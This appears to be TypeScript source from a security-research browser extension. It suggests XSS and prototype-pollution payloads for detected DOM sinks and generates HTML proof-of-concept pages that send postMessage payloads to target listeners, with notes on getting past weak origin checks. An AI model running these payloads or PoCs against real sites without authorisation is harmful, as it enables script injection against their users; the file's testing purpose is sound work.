import { ExtensionListenerMessage, ExtensionPostMessage } from '@src/shared/types/message';
import { originCheckLabel } from './originCheck';

export interface PayloadTemplate {
  label: string;
  /** Payload text. */
  value: string;
  /** Whether `value` is JSON to be parsed, or a raw string. */
  mode: 'json' | 'text';
  /** Short reason this template fits. */
  hint: string;
}

export type PocKind = 'iframe' | 'opener' | 'snippet';

const XSS_HTML = '<img src=x onerror=alert(document.domain)>';
const XSS_SVG = '<svg onload=alert(document.domain)>';
const XSS_JS = 'alert(document.domain)';
const XSS_URL = 'javascript:alert(document.domain)';
const PROTO_POLLUTION = '{"__proto__":{"dominatorPolluted":true}}';

/** Suggests payloads to try, ordered by how well they match the found sinks. */
export function payloadTemplates(sinks: string[], captured?: string): PayloadTemplate[] {
  const has = (fragment: string) => sinks.some(sink => sink.indexOf(fragment) !== -1);
  const templates: PayloadTemplate[] = [];

  if (captured) {
    templates.push({
      label: 'Captured payload',
      value: captured,
      mode: looksLikeJson(captured) ? 'json' : 'text',
      hint: 'as observed',
    });
  }

  if (
    has('innerHTML') ||
    has('outerHTML') ||
    has('insertAdjacentHTML') ||
    has('write') ||
    has('srcdoc') ||
    has('html')
  ) {
    templates.push({ label: 'HTML XSS', value: XSS_HTML, mode: 'text', hint: 'markup sink' });
    templates.push({ label: 'SVG onload', value: XSS_SVG, mode: 'text', hint: 'markup sink' });
  }
  if (has('eval') || has('Function') || has('setTimeout') || has('setInterval')) {
    templates.push({ label: 'JS expression', value: XSS_JS, mode: 'text', hint: 'code sink' });
  }
  if (has('location') || has('src') || has('href') || has('action')) {
    templates.push({ label: 'javascript: URL', value: XSS_URL, mode: 'text', hint: 'navigation sink' });
  }
  templates.push({ label: 'Prototype pollution', value: PROTO_POLLUTION, mode: 'json', hint: 'object merge' });
  if (templates.filter(t => t.label !== 'Captured payload').length === 1) {
    templates.splice(captured ? 1 : 0, 0, { label: 'HTML XSS', value: XSS_HTML, mode: 'text', hint: 'generic probe' });
  }
  return templates;
}

/** The strongest single payload to seed a PoC with. */
export function suggestedPayload(sinks: string[], captured?: string): PayloadTemplate {
  return payloadTemplates(sinks, captured)[0];
}

function looksLikeJson(text: string): boolean {
  const trimmed = text.trim();
  return (trimmed.startsWith('{') && trimmed.endsWith('}')) || (trimmed.startsWith('[') && trimmed.endsWith(']'));
}

function payloadExpression(template: PayloadTemplate): string {
  if (template.mode === 'json') {
    try {
      JSON.parse(template.value);
      return template.value;
    } catch {
      return JSON.stringify(template.value);
    }
  }
  return JSON.stringify(template.value);
}

function originNote(listener: ExtensionListenerMessage): string {
  const kind = listener.originCheck || (listener.checksOrigin ? 'strict' : 'none');
  if (kind === 'none') {
    return 'This listener does not validate event.origin, so any page can drive it.';
  }
  if (kind === 'bypassable') {
    return `NOTE: origin check looks bypassable (${listener.originCheckDetail || 'prefix/suffix/includes'}). Serve from an origin that starts or ends with the target domain.`;
  }
  if (kind === 'source') {
    return 'NOTE: this listener checks event.source (window/parent/opener), not origin. Use the opener PoC or an iframe reference.';
  }
  return 'NOTE: this listener validates event.origin — the PoC must be served from an allowed origin.';
}

function loc(listener: ExtensionListenerMessage): string {
  return listener.source
    ? `${listener.source.fileName}:${listener.source.line}:${listener.source.column}`
    : 'unknown location';
}

function headerComment(listener: ExtensionListenerMessage): string {
  return `DOMinator postMessage PoC
  Target listener registered at ${loc(listener)}
  Origin check: ${originCheckLabel(listener.originCheck || (listener.checksOrigin ? 'strict' : 'none'))}
  Sinks: ${listener.sinks.length ? listener.sinks.join(', ') : 'none detected (static)'}
  ${originNote(listener)}`;
}

/**
 * Builds a self-contained HTML PoC that frames the target document and fires
 * the payload at it after load. For a listener with no origin check this is a
 * working exploit skeleton; the researcher swaps in their own payload.
 */
export function buildPoc(
  listener: ExtensionListenerMessage,
  template: PayloadTemplate,
  kind: PocKind = 'iframe',
): string {
  const target = listener.origin || 'https://TARGET';
  if (kind === 'snippet') return buildSnippet(listener, template);
  if (kind === 'opener') return buildOpenerPoc(listener, template, target);
  return buildIframePoc(listener, template, target);
}

function buildIframePoc(listener: ExtensionListenerMessage, template: PayloadTemplate, target: string): string {
  return `<!doctype html>
<html>
<head><meta charset="utf-8"><title>DOMinator PoC</title></head>
<body>
<!--
  ${headerComment(listener)}
-->
<script>
  const TARGET = ${JSON.stringify(target)};
  const PAYLOAD = ${payloadExpression(template)};
  const frame = document.createElement('iframe');
  frame.src = TARGET;
  frame.style.cssText = 'width:800px;height:500px;border:1px solid #ccc';
  frame.onload = function () {
    let tries = 0;
    const id = setInterval(function () {
      frame.contentWindow.postMessage(PAYLOAD, '*');
      if (++tries >= 5) clearInterval(id);
    }, 300);
  };
  document.body.appendChild(frame);
</script>
</body>
</html>`;
}

function buildOpenerPoc(listener: ExtensionListenerMessage, template: PayloadTemplate, target: string): string {
  return `<!doctype html>
<html>
<head><meta charset="utf-8"><title>DOMinator opener PoC</title></head>
<body>
<!--
  ${headerComment(listener)}
  This variant opens the target as a popup so listeners that talk to window.opener
  (or check event.source === opener) still receive the payload.
-->
<button id="go">Open target and postMessage</button>
<script>
  const TARGET = ${JSON.stringify(target)};
  const PAYLOAD = ${payloadExpression(template)};
  document.getElementById('go').onclick = function () {
    const popup = window.open(TARGET, 'dominator', 'width=900,height=600');
    let tries = 0;
    const id = setInterval(function () {
      try { popup.postMessage(PAYLOAD, '*'); } catch (e) {}
      if (++tries >= 8) clearInterval(id);
    }, 400);
  };
</script>
</body>
</html>`;
}

/** Console / Burp Repeater-style snippet to paste on an attacker origin. */
export function buildSnippet(listener: ExtensionListenerMessage, template: PayloadTemplate): string {
  const target = listener.origin || 'https://TARGET';
  return `// DOMinator postMessage snippet
// Listener at ${loc(listener)}
// ${originNote(listener)}
// Run this on an attacker origin (or in Burp Repeater's HTML).

const TARGET = ${JSON.stringify(target)};
const PAYLOAD = ${payloadExpression(template)};

// iframe:
const frame = document.createElement('iframe');
frame.src = TARGET;
frame.onload = () => frame.contentWindow.postMessage(PAYLOAD, '*');
document.body.appendChild(frame);

// opener:
// const popup = window.open(TARGET);
// setTimeout(() => popup.postMessage(PAYLOAD, '*'), 1000);
`;
}

/** Prefer a captured payload that actually reached this listener when one exists. */
export function capturedPayloadFor(listener: ExtensionListenerMessage, messages: ExtensionPostMessage[]): string | undefined {
  const hits = messages.filter(message => (message.listenerHits || []).indexOf(listener.id) !== -1);
  const confirmed = hits.find(message => message.confirmed) || hits[0];
  return confirmed?.message;
}
